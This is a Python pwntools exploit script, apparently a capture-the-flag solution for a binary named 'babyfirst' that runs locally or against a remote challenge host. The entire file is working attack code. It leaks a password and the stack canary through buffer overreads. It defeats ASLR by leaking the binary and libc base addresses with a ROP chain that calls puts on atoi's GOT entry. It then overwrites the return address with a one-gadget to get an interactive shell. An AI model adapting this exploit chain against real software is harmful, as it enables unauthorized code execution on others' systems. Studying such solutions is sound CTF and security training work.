#!/usr/bin/env python
from pwn import *
import sys

HOST = 'babyfirst.chung96vn.cf'
PORT = 31337

def info(s):
	log.info(s)

def login(user,pw=""):
	p.sendlineafter("Your choice: ","1")
	p.sendafter("User Name: ",user)
	if pw!="":
		p.sendlineafter("Password: ",pw)
def play():
	p.sendlineafter("Your choice: ","2")
def exploit(p):
	login("kt".ljust(0x20))
	play()
	p.recvuntil("kt".ljust(0x20))
	pw=p.recv(0x10)
	info("password is %s"%pw)
	login("admin",pw)
	play()
	p.send("a"*0x29)
	p.recvuntil("a"*0x29)
	canary=u64(('\x00'+p.recv(7)).ljust(8))
	info("canary is 0x%x"%canary)
	rdi=0x0000000000001023
	p.send("a"*0x38)
	p.recvuntil("a"*0x38)
	basebin=u64(p.recv(6).ljust(8,"\x00"))-0xf8d
	info("basebin = 0x%x"%basebin)
	rdi+=basebin
	atoigot=0x201FC8+basebin
	puts=basebin+0x920
	ret=basebin+0xf2d
	payload="a"*0x28
	payload+=p64(canary)
	payload+=p64(0)
	payload+=p64(rdi)
	payload+=p64(atoigot)
	payload+=p64(puts)
	payload+=p64(ret)
	p.send(payload)
	p.sendline("END")
	p.recvuntil("s OK~~\n")
	atoil=u64(p.recv(6).ljust(8,'\x00'))
	baselibc=atoil-libc.symbols['atoi']
	info("base libc 0x%x"%baselibc)
	magic=baselibc+0x4f2c5
	play()
	payload='a'*0x28
	payload+=p64(canary)
	payload+=p64(0)
	payload+=p64(magic)
	payload=payload.ljust(0x80,'\x00')
	p.send(payload)
	p.sendline("END")
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./babyfirst')
		print util.proc.pidof(p)
		pause()
		libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

		exploit(p)

	else:
		p=remote(HOST,PORT)
		libc=ELF("./libc-2.27.so")
		exploit(p)
